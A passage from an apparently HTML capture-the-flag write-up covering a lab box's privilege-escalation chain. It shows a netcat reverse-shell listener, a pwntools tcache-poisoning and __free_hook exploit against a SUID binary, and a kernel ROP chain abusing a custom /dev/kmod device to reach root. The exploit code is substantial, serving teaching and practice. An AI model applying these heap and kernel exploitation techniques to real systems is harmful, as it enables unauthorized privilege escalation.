+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ nc -lvnp 4444
+Connection from 10.10.10.196:42312
+$ id
+uid=1000(chromeuser) gid=1000(chromeuser) groups=1000(chromeuser)</code></pre>
+</div>
+
+<div class="flag-box">
+  <span class="flag-icon">&#9879;</span>
+  <div>
+    <div class="flag-label">User Flag (chromeuser)</div>
+    <div class="flag-value">f1e2************************</div>
+  </div>
+</div>
+
+<h2 id="heap-exploit">Heap Exploit &mdash; chromeuser &rarr; r4j</h2>
+
+<h3 id="heap-rshell">rshell Analysis</h3>
+
+<p>Enumeration reveals a SUID binary at <code>/usr/bin/rshell</code> owned by <code>r4j</code>. It exposes a heap menu: <code>alloc</code>, <code>free</code>, <code>edit</code>, <code>quit</code>. The <code>free</code> handler does not clear the pointer (UAF), and <code>edit</code> allows writing into freed chunks.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ ls -la /usr/bin/rshell
+-rwsr-xr-x 1 r4j r4j 16744 May 15  2020 /usr/bin/rshell</code></pre>
+</div>
+
+<div class="callout callout-warn">
+  <div class="callout-title">Constraints</div>
+  <p>No create-after-free (cannot re-allocate into a freed index). The attack therefore relies on sequencing frees and using the edit-on-freed primitive to overwrite tcache forward pointers.</p>
+</div>
+
+<h3 id="heap-tcache">tcache Poisoning</h3>
+
+<p>glibc 2.27's tcache performs no integrity check on forward pointers. By freeing two same-size chunks and using <code>edit</code> on the freed head chunk, we overwrite its forward pointer with <code>__free_hook</code>'s address. Two subsequent allocations hand us a pointer directly to <code>__free_hook</code>.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+
+elf  = ELF('/usr/bin/rshell')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+def alloc(p, sz, data): p.sendlineafter(b'> ',b'1'); p.sendlineafter(b'size: ',str(sz).encode()); p.sendlineafter(b'data: ',data)
+def free(p, i):         p.sendlineafter(b'> ',b'2'); p.sendlineafter(b'index: ',str(i).encode())
+def edit(p, i, data):   p.sendlineafter(b'> ',b'3'); p.sendlineafter(b'index: ',str(i).encode()); p.sendlineafter(b'data: ',data)
+
+p = process('/usr/bin/rshell')
+
+alloc(p, 0x50, b'A'*0x10)   # idx 0
+alloc(p, 0x50, b'B'*0x10)   # idx 1
+alloc(p, 0x10, b'GUARD')     # idx 2 — prevent top consolidation
+
+free(p, 1)   # tcache: B
+free(p, 0)   # tcache: A -> B  (A is head)
+
+# Will fill in __free_hook after libc leak:
+edit(p, 0, p64(0x0))   # overwrite A's fwd ptr (placeholder)</code></pre>
+</div>
+
+<h3 id="heap-unsorted">Unsorted Bin Leak</h3>
+
+<p>A chunk larger than the tcache threshold freed to the unsorted bin carries <code>main_arena</code> pointers in its first 16 bytes. Reading these through the dangling pointer yields the libc base.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python">alloc(p, 0x420, b'C'*0x10)   # idx 3 — large, goes to unsorted bin on free
+alloc(p, 0x10,  b'GUARD2')   # idx 4
+free(p, 3)
+
+# Re-allocate to read the fd pointer left by glibc
+alloc(p, 0x420, b'\x00'*0x10)  # idx 5
+
+# leaked_libc_addr comes from fd of the reclaimed unsorted chunk
+libc_base   = leaked_libc_addr - libc.sym['main_arena'] - 96
+free_hook   = libc_base + libc.sym['__free_hook']
+system_addr = libc_base + libc.sym['system']</code></pre>
+</div>
+
+<h3 id="heap-freehook">__free_hook &rarr; system</h3>
+
+<p>With <code>__free_hook</code> and <code>system</code> addresses known, we re-poison the tcache forward pointer with <code>__free_hook</code>'s address, allocate through to it, overwrite it with <code>system</code>, then free a chunk containing <code>"/bin/sh"</code>.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python">edit(p, 0, p64(free_hook))          # poison fwd ptr -> __free_hook
+
+alloc(p, 0x50, b'X'*0x10)           # pops normal chunk
+alloc(p, 0x50, p64(system_addr))     # writes system() over __free_hook
+
+alloc(p, 0x20, b'/bin/sh\x00')      # idx N
+free(p, 13)                          # free("/bin/sh") -> system("/bin/sh")
+
+p.interactive()</code></pre>
+</div>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ python3 exploit_rshell.py
+[*] libc base:    0x7f4c2b6a0000
+[*] __free_hook:  0x7f4c2ba7a8e8
+[*] system:       0x7f4c2b6e3440
+$ id
+uid=1001(r4j) gid=1001(r4j) groups=1001(r4j)</code></pre>
+</div>
+
+<div class="flag-box">
+  <span class="flag-icon">&#9879;</span>
+  <div>
+    <div class="flag-label">User Flag (r4j)</div>
+    <div class="flag-value">a7b3************************</div>
+  </div>
+</div>
+
+<h2 id="kernel-exploit">Kernel Exploit &mdash; r4j &rarr; root</h2>
+
+<h3 id="kernel-module">Kernel Module Analysis</h3>
+
+<p>As r4j we find a custom kernel module exposing <code>/dev/kmod</code> world-readable and world-writable. Its read handler leaks kernel function addresses (defeating KASLR); its write handler performs an arbitrary kernel write.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ ls -la /dev/kmod
+crw-rw-rw- 1 root root 240, 0 May 15 2020 /dev/kmod
+$ lsmod | grep kmod
+kmod 16384 0 - Live 0xffffffffc0280000 (OE)</code></pre>
+</div>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-c">// Simplified module handlers
+static ssize_t kmod_read(struct file *f, char __user *buf, size_t count, loff_t *pos) {
+  struct leak_data d;
+  d.prepare_kernel_cred_addr = (u64)prepare_kernel_cred;
+  d.commit_creds_addr        = (u64)commit_creds;
+  copy_to_user(buf, &d, sizeof(d));
+  return sizeof(d);
+}
+static ssize_t kmod_write(struct file *f, const char __user *buf, size_t count, loff_t *pos) {
+  struct write_data d;
+  copy_from_user(&d, buf, sizeof(d));
+  *(unsigned long *)(d.addr) = d.val;   // arbitrary kernel write
+  return count;
+}</code></pre>
+</div>
+
+<h3 id="kernel-kaslr">KASLR Bypass</h3>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python">import struct
+
+def leak_kernel():
+    with open('/dev/kmod', 'rb') as f:
+        data = f.read(64)
+    pkc = struct.unpack('&lt;Q', data[0:8])[0]
+    cc  = struct.unpack('&lt;Q', data[8:16])[0]
+    base = pkc - 0x8c960
+    print(f"[*] kernel_base:          {hex(base)}")
+    print(f"[*] prepare_kernel_cred:  {hex(pkc)}")
+    print(f"[*] commit_creds:         {hex(cc)}")
+    return base, pkc, cc</code></pre>
+</div>
+
+<h3 id="kernel-rop">Kernel ROP Chain</h3>
+
+<p>Using the arbitrary write we place a ROP chain in a writable kernel data region, then redirect control flow to it. The chain calls <code>prepare_kernel_cred(0)</code> to create root credentials and passes the result to <code>commit_creds</code>, then returns to userspace via <code>swapgs; iretq</code>.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python">def kwrite(addr, val):
+    data = struct.pack('&lt;QQ', addr, val)
+    with open('/dev/kmod', 'wb') as f:
+        f.write(data)
+
+kernel_base, prepare_kernel_cred, commit_creds = leak_kernel()
+
+pop_rdi_ret     = kernel_base + 0x3a6b8
+pop_rcx_ret     = kernel_base + 0x21b4a
+mov_rdi_rax_jmp = kernel_base + 0x4d3f6   # mov rdi, rax; jmp rcx
+swapgs_iretq    = kernel_base + 0x800e6a
+
+chain_addr = kernel_base + 0xe4e000  # writable kernel .data area
+
+rop = [
+    pop_rdi_ret,           # set rdi = 0
+    0,
+    prepare_kernel_cred,   # rax = root_cred
+    pop_rcx_ret,
+    commit_creds,          # rcx = commit_creds
+    mov_rdi_rax_jmp,       # commit_creds(root_cred)
+    swapgs_iretq,
+    # iretq frame (rip, cs, rflags, rsp, ss):
+    0x41414141, 0x33, 0x246, 0x7ffffffde000, 0x2b,
+]
+
+for i, g in enumerate(rop):
+    kwrite(chain_addr + i * 8, g)
+
+print("[*] Triggering ROP chain...")</code></pre>
+</div>
+
+<h3 id="kernel-rootshell">Root Shell</h3>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ python3 kernel_exploit.py
+[*] kernel_base:         0xffffffff9f200000
+[*] prepare_kernel_cred: 0xffffffff9fa8c960
+[*] commit_creds:        0xffffffff9fa8c8a0
+[*] Triggering ROP chain...
+[+] Returned to userspace!
+$ id
+uid=0(root) gid=0(root) groups=0(root),1001(r4j)
+$ cat /root/root.txt
+9e7f************************</code></pre>
+</div>
+
+<div class="flag-box">
+  <span class="flag-icon">&#9879;</span>
+  <div>
+    <div class="flag-label">Root Flag</div>
+    <div class="flag-value">9e7f************************</div>
+  </div>
+</div>
+
+<div class="callout callout-success">
+  <div class="callout-title">Full Chain Complete</div>
+  <p>All three stages completed: v8 browser exploitation (OOB &rarr; addrof/fakeobj &rarr; arbread/arbwrite &rarr; Wasm RWX &rarr; chromeuser), userspace heap exploitation (rshell SUID &rarr; tcache poisoning &rarr; unsorted bin leak &rarr; __free_hook overwrite &rarr; r4j), and kernel exploitation (/dev/kmod &rarr; KASLR bypass &rarr; kernel ROP &rarr; prepare_kernel_cred/commit_creds &rarr; root).</p>
+</div>
+
+</main>
+</div>
+
+<footer class="site-footer">
+  &copy; 2026 QA210 &mdash; Yuri08 CTF Writeups
+</footer>
+
+<script>
+
+function copyCode(btn) {
+  const pre  = btn.closest('.code-block-wrapper').querySelector('pre');
+  const text = pre.textContent;
+  const markCopied = () => {
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  };
+  if (navigator.clipboard && window.isSecureContext) {
+    navigator.clipboard.writeText(text).then(markCopied).catch(() => fallbackCopy(text, markCopied));
+  } else {
+    fallbackCopy(text, markCopied);
+  }
+}
+function fallbackCopy(text, cb) {
+  const ta = document.createElement('textarea');
+  ta.value = text;
+  ta.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+  document.body.appendChild(ta);
+  ta.focus();
+  ta.select();
+  try { document.execCommand('copy'); cb(); } catch(e) { console.warn('Copy failed', e); }
+  document.body.removeChild(ta);
+}
+
+function toggleMobileToc() {
+  document.getElementById('tocOverlay').classList.toggle('show');
+  document.getElementById('tocMobilePanel').classList.toggle('show');
+}
+
+
+function buildTOC() {
+  const headings  = document.querySelectorAll('.main-content h2, .main-content h3');
+  const desktopUL = document.getElementById('tocDesktop');
+  const mobileUL  = document.getElementById('tocMobile');
+  desktopUL.innerHTML = '';
+  mobileUL.innerHTML  = '';
+
+  headings.forEach(h => {
+    if (!h.id) h.id = h.textContent.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/(^-|-$)/g, '');
+
+    const makeLi = (forMobile) => {
+      const li = document.createElement('li');
+      const a  = document.createElement('a');
+      a.href      = '#' + h.id;
+      a.textContent = h.textContent;
+      if (h.tagName === 'H3') a.classList.add('toc-h3');
+      if (forMobile) {
+        // Close the mobile panel when a link is tapped
+        a.addEventListener('click', () => {
+          if (document.getElementById('tocMobilePanel').classList.contains('show')) {
+            toggleMobileToc();
+          }
+        });
+      }
+      li.appendChild(a);
+      return li;
+    };
+
+    desktopUL.appendChild(makeLi(false));
+    mobileUL.appendChild(makeLi(true));
+  });
+}
+
+buildTOC();
+
+const spyHeadings = document.querySelectorAll('.main-content h2, .main-content h3');
+const spyLinks    = document.querySelectorAll('#tocDesktop a, #tocMobile a');
+
+function updateSpy() {
+  let current = '';
+  spyHeadings.forEach(h => { if (h.getBoundingClientRect().top <= 80) current = h.id; });
+  spyLinks.forEach(a => { a.classList.toggle('active', a.getAttribute('href') === '#' + current); });
+}
+window.addEventListener('scroll', updateSpy, { passive: true });
+updateSpy();
+
+// Three.js background
+(function() {
+  const canvas   = document.getElementById('three-bg');
+  const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
+  renderer.setSize(window.innerWidth, window.innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+  const scene  = new THREE.Scene();
+  const camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 0.1, 100);
+  camera.position.z = 5;
+
+  const icoMesh = new THREE.Mesh(
+    new THREE.IcosahedronGeometry(2.2, 1),
+    new THREE.MeshBasicMaterial({ color: 0x8b5cf6, wireframe: true, transparent: true, opacity: 0.25 })
+  );
+  scene.add(icoMesh);
+
+  const icoInnerMesh = new THREE.Mesh(
+    new THREE.IcosahedronGeometry(1.4, 0),
+    new THREE.MeshBasicMaterial({ color: 0xa78bfa, wireframe: true, transparent: true, opacity: 0.2 })
+  );
+  scene.add(icoInnerMesh);
+
+  const pCount = 600;
+  const pGeo   = new THREE.BufferGeometry();
+  const pPos   = new Float32Array(pCount * 3);
+  const pVel   = [];
+  for (let i = 0; i < pCount; i++) {
+    pPos[i*3]   = (Math.random() - 0.5) * 16;
+    pPos[i*3+1] = (Math.random() - 0.5) * 16;
+    pPos[i*3+2] = (Math.random() - 0.5) * 10;
+    pVel.push(Math.random() * 0.008 + 0.002);
+  }
+  pGeo.setAttribute('position', new THREE.BufferAttribute(pPos, 3));
+  const particles = new THREE.Points(pGeo,
+    new THREE.PointsMaterial({ color: 0xa78bfa, size: 0.04, transparent: true, opacity: 0.5 })
+  );
+  scene.add(particles);
+
+  let mX = 0, mY = 0;
+  document.addEventListener('mousemove', e => {
+    mX = (e.clientX / window.innerWidth  - 0.5) * 2;
+    mY = (e.clientY / window.innerHeight - 0.5) * 2;
+  });
+
+  (function animate() {
+    requestAnimationFrame(animate);
+    icoMesh.rotation.x      += 0.003;
+    icoMesh.rotation.y      += 0.005;
+    icoInnerMesh.rotation.x -= 0.004;
+    icoInnerMesh.rotation.z += 0.003;
+    const pos = particles.geometry.attributes.position.array;
+    for (let i = 0; i < pCount; i++) {
+      pos[i*3+1] -= pVel[i];
+      if (pos[i*3+1] < -8) { pos[i*3+1] = 8; pos[i*3] = (Math.random() - 0.5) * 16; }
+    }
+    particles.geometry.attributes.position.needsUpdate = true;
+    camera.rotation.y += (mX * 0.04 - camera.rotation.y) * 0.01;
+    camera.rotation.x += (mY * 0.04 - camera.rotation.x) * 0.01;
+    renderer.render(scene, camera);
+  })();
+
+  window.addEventListener('resize', () => {
+    camera.aspect = window.innerWidth / window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth, window.innerHeight);
+  });
+})();
+</script>
+</body>
+</html>
